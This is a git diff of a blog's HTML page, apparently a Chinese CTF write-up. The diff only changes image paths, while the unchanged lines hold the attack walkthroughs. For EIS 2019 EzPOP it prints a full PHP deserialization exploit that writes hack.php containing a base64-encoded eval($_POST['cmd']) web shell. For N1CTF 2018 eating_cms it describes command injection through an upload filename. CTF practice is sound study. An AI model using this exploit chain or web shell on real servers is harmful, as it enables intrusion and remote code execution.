@@ -29,15 +29,15 @@
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="[EIS 2019]EzPOP—easypop没有那么easy">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/07/08/buu4/buu4.md/1.png">
-<meta property="og:image" content="http://example.com/2021/07/08/buu4/buu4.md/2.png">
-<meta property="og:image" content="http://example.com/2021/07/08/buu4/buu4.md/3.png">
+<meta property="og:image" content="http://example.com/.com//1.png">
+<meta property="og:image" content="http://example.com/.com//2.png">
+<meta property="og:image" content="http://example.com/.com//3.png">
 <meta property="article:published_time" content="2021-07-08T13:18:45.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:37:51.317Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/07/08/buu4/buu4.md/1.png">
+<meta name="twitter:image" content="http://example.com/.com//1.png">
 
 <link rel="canonical" href="http://example.com/2021/07/08/buu4/">
 
@@ -296,10 +296,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">	protected $store;</span><br><span class="line">	protected $key;</span><br><span class="line">	protected $expire;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;key=&#x27;hack.php&#x27;;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	public function start($tmp)&#123;</span><br><span class="line">		$this-&gt;store=$tmp;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">	public $options;</span><br><span class="line">&#125;</span><br><span class="line">$a=new A();</span><br><span class="line">$b=new B();</span><br><span class="line">$b-&gt;options[&#x27;prefix&#x27;] = &quot;php://filter/write=convert.base64-decode/resource=&quot;;</span><br><span class="line">$b-&gt;options[&#x27;expire&#x27;] = 11;</span><br><span class="line">$b-&gt;options[&#x27;data_compress&#x27;] = false;</span><br><span class="line">$b-&gt;options[&#x27;serialize&#x27;] = &#x27;strval&#x27;;</span><br><span class="line">$a-&gt;start($b);</span><br><span class="line">$object = array(&quot;path&quot;=&gt;&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg&quot;);</span><br><span class="line">$path = &#x27;123&#x27;;</span><br><span class="line">$a-&gt;cache = array($path=&gt;$object);</span><br><span class="line">$a-&gt;complete = &#x27;1&#x27;;</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>生成后传入参数先生成hack.php文件后，再访问hack.php，然后通过执行命令获得flag。</p>
-<p><img src="buu4.md/1.png"></p>
+<p><img src="/.com//1.png"></p>
 <h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>观察url发现page参数可以利用php伪协议读取文件。</p>
 <p>读取一下guest、user，guest里面没什么东西，在user.php中包含function.php文件</p>
-<p><img src="buu4.md/2.png"></p>
+<p><img src="/.com//2.png"></p>
 <p>我们读取一下function.php这里面有主要函数，还有几个类似flag的参数，访问一下，提示在m4aaannngggeee有东西，再次读取m4aaannngggeee，包含了一个上传的页面，但是这里不是文件上传漏洞的利用，我们再尝试直接访问m4aaannngggeee。这里才是真正的文件上传漏洞位置。</p>
 <p>由于在upllloadddd.php源码中存在这句话，我们可以执行任意命令。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);</span><br></pre></td></tr></table></figure>
@@ -307,7 +307,7 @@
 
 
 <p>我们通过上传的文件名来执行任意代码。</p>
-<p><img src="buu4.md/3.png"></p>
+<p><img src="/.com//3.png"></p>
 <p>成功执行。</p>
 <p>已经知道flag不在该目录，我们访问下一级，拿到flag。</p>
 <p>最终文件名的payload：</p>
